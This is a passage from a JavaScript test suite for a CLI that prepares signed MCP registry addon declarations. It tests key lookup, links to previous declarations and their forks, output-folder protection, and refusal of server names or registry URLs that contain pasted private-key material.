  assert.equal(compareVersions('1.0.0+a', '1.0.0+b'), null);
  assert.equal(compareVersions('v1.0.0', '1.0.0'), null);
  assert.equal(compareVersions('1.0', '1.0.0'), null);
});

test('a sub namespace whose key is published by dns at a parent domain', async () => {
  const SUB = 'com.example.sub/weather';
  const subFolder = `/.well-known/addon-declaration/${SUB}/`;
  const registry = { [regPath('latest', SUB)]: { body: listingFor({ name: SUB }) } };
  const dnsKeys = (d) => (d === HOST ? { keys: published, notes: [] } : { keys: [], notes: [`no TXT records at ${d}`] });
  const httpKeys = (d) => ({ keys: [], notes: [`https://${d}/.well-known/mcp-registry-auth answered HTTP 404`], status: 404 });
  const out = freshOut();
  await scenario({ registry, site: baseSite(), httpKeys, dnsKeys }, [SUB, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--json'], (r, w) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.deepEqual(w.lookups, [['http', 'sub.example.com'], ['dns', 'sub.example.com'], ['dns', HOST]]);
    assert.deepEqual(r.json.declaration.key, { method: 'dns', domain: HOST });
    assert.match(r.json.steps.find((s) => s.step === 2).line, /a parent of sub\.example\.com/);
    assert.ok(r.json.files.filter((f) => f.upload).every((f) => f.url.startsWith(`https://${HOST}${subFolder}`)));
  }, { env: ENV });
  // --method http asks only the exact domain.
  await scenario({ registry, site: baseSite(), httpKeys, dnsKeys }, [SUB, '--for-version', '1.0.1', '--method', 'http', '--out', freshOut()], (r, w) => {
    assert.equal(r.code, 26, r.stdout + r.stderr);
    assert.deepEqual(w.lookups, [['http', 'sub.example.com']]);
  });
  // With no record anywhere, the reason names the parent route.
  await scenario({ registry, site: baseSite(), httpKeys, dnsKeys: { keys: [], notes: [] } }, [SUB, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 26, r.stdout + r.stderr);
    assert.match(r.stdout, /a TXT record at a parent domain \(example\.com\) is accepted too/);
  });
  // check-listing reads the result after the upload and publication.
  const pointer = JSON.parse(readOut(out, 'pointer.json'));
  const newListing = listingFor({ name: SUB, version: '1.0.1' });
  newListing.server._meta = pointer._meta;
  const site = {};
  const siteDir = path.join(out, 'site');
  for (const rel of filesUnder(siteDir)) site[`${HOST}/${rel}`] = { body: fs.readFileSync(path.join(siteDir, rel)) };
  const w2 = await world({ registry: { [regPath('1.0.1', SUB)]: { body: newListing } }, site, dnsKeys, httpKeys });
  try {
    const c = await w2.run([SUB, '--version', '1.0.1', '--registry', w2.registryUrl, '--now', NOW], { command: 'check-listing' });
    assert.equal(c.code, 0, c.stdout + c.stderr);
  } finally {
    await w2.close();
  }
});

test('--no-pointer: a listing remote that is not in canonical form is declared as its WHATWG serialization', async () => {
  const listing = listingFor({ pointerTo: d2, remotes: [{ type: 'streamable-http', url: 'https://example.com/x/../mcp' }] });
  const site = baseSite({ [`${HOST}${folder}by-hash/${hex(d2)}.json`]: { body: text(d2) } });
  await scenario({ registry: baseRegistry({ [regPath()]: { body: listing } }), site }, [NAME, '--for-version', '1.0.0', '--no-pointer', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.deepEqual(r.json.declaration.remotes, [REMOTE]);
    assert.ok(r.json.notes.some((n) => /is declared as https:\/\/example\.com\/mcp, its WHATWG URL serialization/.test(n)));
  }, { env: ENV });
  // A URL over 2048 characters is reported as too long.
  const { declarableRemotes } = await import('../lib/prepare.js');
  assert.match(declarableRemotes([{ type: 'streamable-http', url: `https://EXAMPLE.com/${'a'.repeat(2100)}` }]).problems[0], /longer than 2048 characters/);
});

test('--now later than the clock gives a note, in the output and in NEXT_STEPS', async () => {
  const out = freshOut();
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.1.0', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--now', '2099-01-01T00:00:00Z'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /note: --now \(2099-01-01T00:00:00Z\) is later than this machine.s clock/);
  }, { env: ENV });
  assert.match(readOut(out, 'NEXT_STEPS.txt'), /Note: --now \(2099-01-01T00:00:00Z\) is later than this machine.s clock/);
});

test('--json: listing names the server and the registry, also when the run stops early', async () => {
  await scenario({ registry: baseRegistry(), site: baseSite() }, ['io.github.someone/tool', '--for-version', '1.0.1', '--out', freshOut(), '--json'], (r, w) => {
    assert.equal(r.code, 24);
    assert.equal(r.json.listing.name, 'io.github.someone/tool');
    assert.equal(r.json.listing.registry, w.registryUrl);
    assert.equal(r.json.listing.url, null);
  });
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.1.0', '--out', freshOut(), '--json'], (r, w) => {
    assert.equal(r.code, 0);
    assert.equal(r.json.listing.name, NAME);
    assert.equal(r.json.listing.registry, w.registryUrl);
    assert.equal(r.json.listing.latestVersion, '1.0.0');
  });
  assert.match(HELP_PREPARE, /builds a declaration in\s+format addon-declaration\/0\.2/);
});

// ---- recheck fixes (19 November 2026) ----

test('finding 1: a server name holding a hex key cut into pieces is refused before any request; long ordinary names are not', async () => {
  const hexKey = k.hex;
  for (const name of [`com.example/${hexKey.slice(0, 32)}-${hexKey.slice(32)}`, `com.example/k${hexKey.slice(0, 20)}_${hexKey.slice(20, 44)}.${hexKey.slice(44)}`]) {
    await scenario({ registry: baseRegistry(), site: baseSite() }, [name, '--for-version', '1.0.1', '--out', freshOut()], (r, w) => {
      assert.equal(r.code, 1, r.stdout + r.stderr);
      assert.match(r.stderr, /the server name looks like key material/);
      assert.equal(w.seen.length, 0, 'no request was made');
      assert.ok(!r.stderr.includes(hexKey.slice(0, 20)) && !r.stdout.includes(hexKey.slice(0, 20)));
      assertNoSecrets(r.stdout, r.stderr);
    });
  }
  // Long ordinary names (also of mixed case words and digits, and with hex
  // letter words), and one 40 digit hex run, reach the registry.
  for (const name of ['com.example/weather-forecast-server-production-edition-europe-west-2024', 'com.example/Weather.Forecast.Server2024.Production.Edition.EuropeWest3', 'com.example/deadbeefcafebabe-facade-decade-accede-0123456789', 'com.example/build-0123456789abcdef0123456789abcdef01234567']) {
    await scenario({ registry: baseRegistry(), site: baseSite() }, [name, '--for-version', '1.0.1', '--out', freshOut()], (r, w) => {
      assert.equal(r.code, PREPARE_STATES.listing_not_found, r.stdout + r.stderr);
      assert.ok(w.seen.length > 0);
    });
  }
});

test('finding 2: a --registry holding key material is refused before any request, in prepare and check-listing', async () => {
  const hexKey = k.hex;
  const bad = [
    `https://registry.example/${hexKey}`,
    `https://registry.example/v0/${hexKey.slice(0, 32)}/${hexKey.slice(32)}`,
    `https://registry.example/${k.secretStrings[4]}`,
    // Standard base64 as one path segment ("/" inside it is a known gap of the
    // best effort screening, so it is written here with "+" in its place).
    `https://registry.example/mirror/${k.secretStrings[3].replace(/\//g, '+')}`,
  ];
  for (const reg of bad) {
    for (const command of ['prepare', 'check-listing']) {
      const args = command === 'prepare' ? [NAME, '--for-version', '1.0.1', '--out', freshOut(), '--registry', reg, '--now', NOW] : [NAME, '--registry', reg, '--now', NOW];
      await scenario({ registry: baseRegistry(), site: baseSite() }, args, (r, w) => {
        assert.equal(r.code, 1, `${command}: ${r.stdout}${r.stderr}`);
        assert.match(r.stderr, /--registry looks like it holds key material/);
        assert.equal(w.seen.length, 0, 'no request was made');
        assert.ok(!r.stderr.includes(hexKey.slice(0, 16)));
        assertNoSecrets(r.stdout, r.stderr);
      }, { command, registryArg: false });
    }
  }
  // The default registry and ordinary custom registries are accepted.
  for (const ok of [DEFAULT_REGISTRY, 'https://registry.example/v0', 'https://mirror.example.com/tenants/0123456789abcdef0123456789abcdef/registry', 'http://127.0.0.1:8080/MyCompanyRegistry/Mirror2']) {
    assert.doesNotThrow(() => registryBase(ok), ok);
  }
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.1.0', '--out', freshOut()], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
  });
});

test('finding 3: when latest.json cannot be linked, the declaration the listing names is tried next; a listing pointer with nothing linkable stops unless --no-previous', async () => {
  const forged = { ...JSON.parse(text(d2)), signature: JSON.parse(text(d1)).signature };
  const registry = baseRegistry({ [regPath()]: { body: listingFor({ pointerTo: d2 }) } });
  // latest.json holds a declaration whose signature does not verify; the listing names d2, which is served: d2 is linked.
  const out = freshOut();
  await scenario({ registry, site: baseSite({ [`${HOST}${folder}latest.json`]: { body: text(forged) }, [`${HOST}${folder}by-hash/${hex(d2)}.json`]: { body: text(d2) } }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.linked, true);
    assert.equal(r.json.previous.hash, declarationHash(d2));
    assert.match(r.json.previous.source, /by-hash/);
    assert.ok(r.json.notes.some((n) => /latest\.json is not linked as previous: it gives invalid_signature/.test(n)));
    assert.match(r.json.steps.find((s) => s.step === 5).line, /the declaration the listing of 1\.0\.0 names holds .*\(latest\.json could not be linked\)/);
  }, { env: ENV });
  assert.equal(JSON.parse(readOut(out, 'declaration.unsigned.json')).previous, declarationHash(d2));
  // latest.json is for another server, and the by-hash URL serves another declaration: stop with nothing written.
  const other = signDeclaration({ ...JSON.parse(text(d2)), signature: undefined, name: 'com.example/other' }, k.loaded);
  const out2 = freshOut();
  const notLinkable = baseSite({ [`${HOST}${folder}latest.json`]: { body: text(other) }, [`${HOST}${folder}by-hash/${hex(d2)}.json`]: { body: text(d1) } });
  await scenario({ registry, site: notLinkable }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out2], (r) => {
    assert.equal(r.code, PREPARE_STATES.previous_not_linkable, r.stdout + r.stderr);
    assert.equal(r.code, 36);
    assert.match(r.stdout, /^previous_not_linkable: /);
    assert.match(r.stdout, /reason: latest\.json \(.*\) cannot be linked as previous: it is for com\.example\/other/);
    assert.match(r.stdout, /reason: the declaration the listing of 1\.0\.0 names \(.*\) cannot be linked as previous: its declaration hash is/);
    assert.match(r.stdout, /give --no-previous to start a new history on purpose/);
  }, { env: ENV });
  assert.deepEqual(filesUnder(out2), []);
  // latest.json is absent and the declaration the listing names is not served: stop too.
  await scenario({ registry, site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 36, r.stdout + r.stderr);
    assert.match(r.stdout, /it is not served at https:\/\/example\.com\/.*by-hash\/.* \(HTTP 404\)/);
  });
  // --no-previous accepts a new history: nothing is read for step 5, a note says so.
  const out3 = freshOut();
  await scenario({ registry, site: notLinkable }, [NAME, '--for-version', '1.0.1', '--no-previous', '--key-env', 'MCP_PRIVATE_KEY', '--out', out3, '--json'], (r, w) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.linked, false);
    assert.equal(r.json.previous.result, 'not_read');
    assert.equal(r.json.declaration.previous, null);
    assert.equal(r.json.steps.find((s) => s.step === 5).result, 'skipped');
    assert.ok(r.json.notes.some((n) => /--no-previous was given: the new declaration names no previous, so its history starts here/.test(n)));
    assert.ok(!w.seen.some((s) => s.path.endsWith('latest.json') || s.path.includes('/by-hash/')), 'nothing was read for the previous declaration');
  }, { env: ENV });
  assert.equal(JSON.parse(readOut(out3, 'declaration.unsigned.json')).previous, undefined);
  // A listing with no pointer and no linkable latest.json stays a first declaration.
  await scenario({ registry: baseRegistry(), site: baseSite({ [`${HOST}${folder}latest.json`]: { body: text(other) } }) }, [NAME, '--for-version', '1.0.1', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.linked, false);
    assert.equal(r.json.declaration.previous, null);
  });
  // --no-previous with --no-pointer is a usage error.
  await scenario({ registry, site: baseSite() }, [NAME, '--for-version', '1.0.0', '--no-pointer', '--no-previous', '--out', freshOut()], (r, w) => {
    assert.equal(r.code, 1, r.stdout + r.stderr);
    assert.match(r.stderr, /--no-previous cannot be given with --no-pointer/);
    assert.equal(w.seen.length, 0);
  });
  assert.match(HELP_PREPARE.replace(/\s+/g, ' '), /--no-previous reads no previous declaration and names none/);
});

test('finding 4: a dry run or an unsigned run with --force does not remove a signed set; a signed run with --force may', async () => {
  const out = freshOut();
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.1.0', '--key-env', 'MCP_PRIVATE_KEY', '--out', out], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
  }, { env: ENV });
  const signedSet = filesUnder(out);
  const before = Object.fromEntries(signedSet.map((f) => [f, readOut(out, f)]));
  assert.ok(signedSet.includes('pointer.json') && signedSet.includes('NEXT_STEPS.txt') && signedSet.some((f) => f.includes('/by-hash/')));
  for (const extra of [['--dry-run', '--key-env', 'MCP_PRIVATE_KEY'], []]) {
    for (const force of [['--force'], []]) {
      await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.2.0', '--out', out, ...force, ...extra], (r, w) => {
        assert.equal(r.code, PREPARE_STATES.output_folder_not_empty, r.stdout + r.stderr);
        assert.match(r.stdout, /holds a signed set from an earlier prepare run/);
        assert.match(r.stdout, /does not remove signed files, also with --force\. Give another --out/);
        assert.equal(w.seen.length, 0, 'no request was made');
      }, { env: ENV });
    }
  }
  assert.deepEqual(filesUnder(out), signedSet);
  for (const f of signedSet) assert.equal(readOut(out, f), before[f], `${f} is unchanged`);
  // An unsigned run with --force over an unsigned run still replaces declaration.unsigned.json.
  const out2 = freshOut();
  for (const v of ['1.1.0', '1.2.0']) {
    await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', v, '--out', out2, '--force'], (r) => {
      assert.equal(r.code, 0, r.stdout + r.stderr);
    });
  }
  assert.equal(JSON.parse(readOut(out2, 'declaration.unsigned.json')).version, '1.2.0');
  const readme = fs.readFileSync(new URL('../README.md', import.meta.url), 'utf8').replace(/\s+/g, ' ');
  assert.match(readme, /it refuses a folder that holds a signed set from an earlier run, also with `--force`/);
});

test('finding 5: NEXT_STEPS.txt in --no-pointer mode has no stray comma', async () => {
  const out = freshOut();
  const site = baseSite({ [`${HOST}${folder}by-hash/${hex(d1)}.json`]: { body: text(d1) }, [`${HOST}${folder}versions/1.0.0.json`]: { body: text(d2) }, [`${HOST}${folder}latest.json`]: { body: text(d2) } });
  const registry = baseRegistry({ [regPath()]: { body: listingFor({ pointerTo: d1 }) } });
  await scenario({ registry, site }, [NAME, '--for-version', '1.0.0', '--no-pointer', '--key-env', 'MCP_PRIVATE_KEY', '--out', out], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
  }, { env: ENV });
  const next = readOut(out, 'NEXT_STEPS.txt');
  assert.match(next, /^Do not upload declaration\.unsigned\.json or this file\.$/m);
  assert.ok(!next.includes('declaration.unsigned.json, or'));
});

// ---- second recheck (19 November 2026) ----

// A third 0.2 declaration for 1.0.0 that follows d2, and one that forks from d1.
const d3 = signDeclaration({ ...JSON.parse(text(d2)), signature: undefined, issuedAt: '2026-11-18T12:00:00Z', previous: declarationHash(d2) }, k.loaded);
const dFork = signDeclaration({ ...JSON.parse(text(d2)), signature: undefined, issuedAt: '2026-11-18T11:30:00Z', previous: declarationHash(d1) }, k.loaded);
const byHashRoute = (d) => `${HOST}${folder}by-hash/${hex(d)}.json`;
const latestRoute = `${HOST}${folder}latest.json`;
const pointerRegistry = (d) => baseRegistry({ [regPath()]: { body: listingFor({ pointerTo: d }) } });
const byHashReads = (w) => w.seen.filter((s) => s.path.includes('/by-hash/')).map((s) => s.path.slice(s.path.lastIndexOf('/') + 1));

test('recheck A: a stale latest.json is not linked when the listing names a declaration that follows it', async () => {
  // The listing names d2 (d2.previous = d1); the site serves latest.json = d1, an older valid declaration.
  const out = freshOut();
  await scenario({ registry: pointerRegistry(d2), site: baseSite({ [latestRoute]: { body: text(d1) }, [byHashRoute(d2)]: { body: text(d2) } }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--json'], (r, w) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.linked, true);
    assert.equal(r.json.previous.hash, declarationHash(d2));
    assert.equal(r.json.previous.ancestry.relation, 'named_follows');
    assert.equal(r.json.previous.ancestry.latest, declarationHash(d1));
    assert.equal(r.json.previous.ancestry.named, declarationHash(d2));
    const line = r.json.steps.find((s) => s.step === 5).line;
    assert.match(line, /the declaration the listing of 1\.0\.0 names holds sha256:/);
    assert.match(line, /follows latest\.json \(sha256:[0-9a-f]{64}\) in 1 link, so latest\.json is behind/);
    assert.ok(line.includes(`read: https://${HOST}${folder}latest.json, https://${HOST}${folder}by-hash/${hex(d2)}.json`), line);
    assert.ok(r.json.notes.some((n) => /latest\.json \(.*\) is behind: it holds .*, and the latest\.json written by this run replaces it/.test(n)), r.json.notes.join('\n'));
    // A direct link needs no walk: the by-hash file of d2 is read once, and nothing else.
    assert.deepEqual(byHashReads(w), [`${hex(d2)}.json`]);
  }, { env: ENV });
  assert.equal(JSON.parse(readOut(out, 'declaration.unsigned.json')).previous, declarationHash(d2));
});

test('recheck A: two links apart, each way, through by-hash files; every read is named in step 5', async () => {
  // latest.json = d3 follows d1, the one the listing names, through d2.
  await scenario({ registry: pointerRegistry(d1), site: baseSite({ [latestRoute]: { body: text(d3) }, [byHashRoute(d1)]: { body: text(d1) }, [byHashRoute(d2)]: { body: text(d2) } }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r, w) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.hash, declarationHash(d3));
    assert.match(r.json.previous.source, /latest\.json$/);
    assert.equal(r.json.previous.ancestry.relation, 'latest_follows');
    const line = r.json.steps.find((s) => s.step === 5).line;
    assert.match(line, /^latest\.json holds .*; latest\.json follows the declaration the listing of 1\.0\.0 names \(sha256:[0-9a-f]{64}\) in 2 links/);
    assert.ok(line.includes(`by-hash/${hex(d2)}.json`), line);
    assert.deepEqual(r.json.previous.ancestry.read, [`https://${HOST}${folder}latest.json`, `https://${HOST}${folder}by-hash/${hex(d1)}.json`, `https://${HOST}${folder}by-hash/${hex(d2)}.json`]);
    assert.ok(!r.json.notes.some((n) => /is behind/.test(n)));
    assert.ok(byHashReads(w).length <= 3, byHashReads(w).join(', '));
  }, { env: ENV });
  // The listing names d3; latest.json = d1 is two links behind it.
  await scenario({ registry: pointerRegistry(d3), site: baseSite({ [latestRoute]: { body: text(d1) }, [byHashRoute(d3)]: { body: text(d3) }, [byHashRoute(d2)]: { body: text(d2) } }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.hash, declarationHash(d3));
    assert.equal(r.json.previous.ancestry.relation, 'named_follows');
    assert.match(r.json.steps.find((s) => s.step === 5).line, /follows latest\.json \(.*\) in 2 links, so latest\.json is behind/);
  }, { env: ENV });
});

test('recheck A: the same hash at latest.json and in the listing is linked as before, with no extra read', async () => {
  await scenario({ registry: pointerRegistry(d2), site: baseSite({ [latestRoute]: { body: text(d2) }, [byHashRoute(d2)]: { body: text(d2) } }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r, w) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.hash, declarationHash(d2));
    assert.equal(r.json.previous.ancestry, undefined);
    assert.match(r.json.previous.source, /latest\.json$/);
    assert.deepEqual(byHashReads(w), [`${hex(d2)}.json`], 'only the check that the previous declaration is served by hash');
  }, { env: ENV });
});

test('recheck A: a fork between latest.json and the declaration the listing names stops (exit 36) unless --no-previous', async () => {
  // latest.json = dFork and the listing names d2: both follow d1, neither follows the other.
  const site = baseSite({ [latestRoute]: { body: text(dFork) }, [byHashRoute(d2)]: { body: text(d2) }, [byHashRoute(d1)]: { body: text(d1) } });
  const out = freshOut();
  await scenario({ registry: pointerRegistry(d2), site }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out], (r, w) => {
    assert.equal(r.code, PREPARE_STATES.previous_not_linkable, r.stdout + r.stderr);
    assert.equal(r.code, 36);
    assert.match(r.stdout, /^previous_not_linkable: /);
    assert.ok(r.stdout.includes(`reason: latest.json (https://${HOST}${folder}latest.json) holds ${declarationHash(dFork)}: its history ends at ${declarationHash(d1)} without reaching the declaration the listing names`), r.stdout);
    assert.ok(r.stdout.includes(`reason: the declaration the listing of 1.0.0 names (https://${HOST}${folder}by-hash/${hex(d2)}.json) is ${declarationHash(d2)}: its history ends at ${declarationHash(d1)} without reaching the declaration at latest.json`), r.stdout);
    assert.match(r.stdout, /do not follow one another within 8 links/);
    assert.match(r.stdout, /give --no-previous to start a new history on purpose/);
    assert.match(r.stdout, /step 5, previous declaration: latest\.json holds .* neither follows the other within 8 links \(read: .*latest\.json, .*by-hash\/[0-9a-f]{64}\.json, .*by-hash\/[0-9a-f]{64}\.json\)/);
    // d1 is read once, though both walks pass through it.
    assert.deepEqual(byHashReads(w), [`${hex(d2)}.json`, `${hex(d1)}.json`]);
  }, { env: ENV });
  assert.deepEqual(filesUnder(out), []);
  await scenario({ registry: pointerRegistry(d2), site }, [NAME, '--for-version', '1.0.1', '--no-previous', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.declaration.previous, null);
  }, { env: ENV });
});

test('recheck A: a linkable latest.json does not hide a named declaration that cannot be linked or read', async () => {
  // The listing names d2, which is not served; latest.json = d1 could be linked: stop (36), naming both.
  await scenario({ registry: pointerRegistry(d2), site: baseSite({ [latestRoute]: { body: text(d1) } }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 36, r.stdout + r.stderr);
    assert.equal(r.json.previous.linked, false);
    assert.equal(r.json.previous.latest.hash, declarationHash(d1));
    assert.ok(r.json.reasons.some((x) => x.includes(`latest.json (https://${HOST}${folder}latest.json) holds ${declarationHash(d1)}, which could be linked`)), r.json.reasons.join('\n'));
    assert.ok(r.json.reasons.some((x) => /^the declaration the listing of 1\.0\.0 names \(.*\) cannot be linked as previous: it is not served at .* \(HTTP 404\)$/.test(x)), r.json.reasons.join('\n'));
  }, { env: ENV });
  // The named one serves another declaration (its hash differs): stop (36).
  await scenario({ registry: pointerRegistry(d2), site: baseSite({ [latestRoute]: { body: text(d1) }, [byHashRoute(d2)]: { body: text(d3) } }) }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 36, r.stdout + r.stderr);
    assert.match(r.stdout, /cannot be linked as previous: its declaration hash is/);
  });
  // The named one answers 503, or the connection drops: previous_unreadable (35).
  const drop = (req) => req.socket.destroy();
  for (const route of [{ status: 503, body: 'busy' }, drop]) {
    await scenario({ registry: pointerRegistry(d2), site: baseSite({ [latestRoute]: { body: text(d1) }, [byHashRoute(d2)]: route }) }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
      assert.equal(r.code, 35, r.stdout + r.stderr);
      assert.match(r.stdout, /^previous_unreadable: /);
      assert.ok(r.stdout.includes(`by-hash/${hex(d2)}.json`), r.stdout);
    });
  }
  // A by-hash file on the walk answers 503, or the connection drops: previous_unreadable (35).
  for (const route of [{ status: 503, body: 'busy' }, drop]) {
    await scenario({ registry: pointerRegistry(d3), site: baseSite({ [latestRoute]: { body: text(d1) }, [byHashRoute(d3)]: { body: text(d3) }, [byHashRoute(d2)]: route }) }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
      assert.equal(r.code, 35, r.stdout + r.stderr);
      assert.ok(r.stdout.includes(`by-hash/${hex(d2)}.json`), r.stdout);
    });
  }
  // A by-hash file on the walk that is absent ends that history: neither follows, so 36.
  await scenario({ registry: pointerRegistry(d3), site: baseSite({ [latestRoute]: { body: text(d1) }, [byHashRoute(d3)]: { body: text(d3) } }) }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 36, r.stdout + r.stderr);
    assert.match(r.stdout, /could not be fetched from its by-hash path \(HTTP 404\)/);
  });
});

test('recheck A: --no-pointer still follows the declaration check-listing puts in force, whatever latest.json holds', async () => {
  // The listing names d2 and latest.json serves d1, which check-listing sets aside: d2 is in force and followed.
  const site = baseSite({ [latestRoute]: { body: text(d1) }, [byHashRoute(d2)]: { body: text(d2) }, [byHashRoute(d1)]: { body: text(d1) } });
  await scenario({ registry: pointerRegistry(d2), site }, [NAME, '--for-version', '1.0.0', '--no-pointer', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.hash, declarationHash(d2));
    assert.equal(r.json.previous.checkListingState, 'verified');
    assert.equal(r.json.previous.ancestry, undefined);
  }, { env: ENV });
  // The listing names d1 and latest.json serves d3 (d3 follows d1 through d2): check-listing puts d3 in force, and it is followed.
  const site2 = baseSite({ [latestRoute]: { body: text(d3) }, [byHashRoute(d1)]: { body: text(d1) }, [byHashRoute(d2)]: { body: text(d2) } });
  await scenario({ registry: pointerRegistry(d1), site: site2 }, [NAME, '--for-version', '1.0.0', '--no-pointer', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.previous.hash, declarationHash(d3));
    assert.equal(r.json.previous.checkListingState, 'verified_newer_declaration');
  }, { env: ENV });
});

// Fixed 32 byte values whose base64 forms suit each rule (no randomness in these tests).
function key32(want) {
  for (let i = 0; ; i++) {
    const b = crypto.createHash('sha256').update(`registry key ${i}`).digest();
    if (want(b)) return b;
  }
}
const mixed = (s) => /[A-Z]/.test(s) && /[a-z]/.test(s) && /[0-9]/.test(s);
const KEY_URL = key32((b) => mixed(b.toString('base64url')) && /[-_]/.test(b.toString('base64url'))).toString('base64url');
const KEY_STD = key32((b) => mixed(b.toString('base64')) && b.toString('base64').includes('+') && !b.toString('base64').includes('/')).toString('base64');
const KEY_SLASH = key32((b) => mixed(b.toString('base64')) && b.toString('base64').includes('/')).toString('base64');
const HEX64 = key32(() => true).toString('hex');

test('recheck B: --registry screening refuses the common pasted key forms and accepts ordinary custom registry URLs', async () => {
  const accepted = [
    DEFAULT_REGISTRY,
    'https://gitlab.example.com/api/v4/projects/My-Group-2024/MCP-Registry-Mirror/v0',
    'https://registry.example.com/Organizations/AcmeCorporation2024/Mirror',
    'https://api.Example2Corp.com/Api/V1/Registry/Production/Mirror/East/Zone3',
    'https://example.com/MyCompanyRegistry2024/ProductionMirror01Eu',
    'http://127.0.0.1:8080',
    'http://localhost:3000/v0',
    'http://127.0.0.1:8080/MyCompanyRegistry/Mirror2',
    'https://mirror.example.com/tenants/0123456789abcdef0123456789abcdef/registry',
    'https://mirror.example.com/tenants/0123456789ABCDEF0123456789ABCDEF',
    'https://registry.example/v0/build-0123456789abcdef0123456789abcdef01234567',
    // 44 characters of base64 without padding decode to 33 bytes, not a key.
    `https://registry.example/${'Ab1'.repeat(14)}xy`,
    // 43 characters with no digit: not rule 4.
    `https://registry.example/${'Abc'.repeat(14)}d`,
  ];
  for (const u of accepted) {
    assert.equal(urlHoldsKey(u), false, u);
    assert.doesNotThrow(() => registryBase(u), u);
  }
  const pairs = HEX64.match(/../g);
  const refused = [
    [`https://registry.example/${HEX64}`, 'rule 1, a path segment'],
    [`https://${HEX64}.example.com/v0`, 'rule 1, a host label'],
    [`https://registry.example/v0/${HEX64.slice(0, 32)}/${HEX64.slice(32)}`, 'rule 2, two pieces'],
    [`https://registry.example/a${HEX64.slice(0, 16)}-${HEX64.slice(16, 32)}.x/${HEX64.slice(32, 48)}_${HEX64.slice(48)}`, 'rule 2, four pieces of 16'],
    [`https://registry.example/keys/${pairs.join(':')}`, 'rule 3, colon separated'],
    [`https://registry.example/keys/${pairs.join('%3A')}`, 'rule 3, after percent decoding'],
    [`https://registry.example/${HEX64.slice(0, 32)}%2F${HEX64.slice(32)}`, 'rule 2, after percent decoding'],
    [`https://registry.example/mirror/${KEY_URL}`, 'rule 4, base64url'],
    [`https://registry.example/mirror/${KEY_STD.replace(/=$/, '')}`, 'rule 4, base64 without padding'],
    [`https://registry.example/mirror/${KEY_STD}`, 'rule 4, base64 with padding'],
    [`https://registry.example/mirror/${encodeURIComponent(KEY_STD)}/v0`, 'rule 4, percent encoded'],
    ['https://registry.example/-----BEGIN PRIVATE KEY-----', 'rule 5, PEM text'],
  ];
  for (const [u, why] of refused) {
    assert.equal(urlHoldsKey(u), true, why);
    assert.throws(() => registryBase(u), /--registry looks like it holds key material/, why);
  }
  // Known gaps, accepted on purpose and listed in keylike.js: a standard base64
  // key with "/" inside (read as several segments), and hex pieces under 16 digits.
  assert.equal(urlHoldsKey(`https://registry.example/mirror/${KEY_SLASH}`), false);
  assert.equal(urlHoldsKey(`https://registry.example/${HEX64.match(/.{8}/g).join('-')}`), false);
  // An ordinary custom URL passes the CLI screening (the request then fails offline, which is not the point here).
  let stderr = '';
  const asked = [];
  const offline = async (url) => {
    asked.push(url);
    throw new Error('offline test: no request leaves the machine');
  };
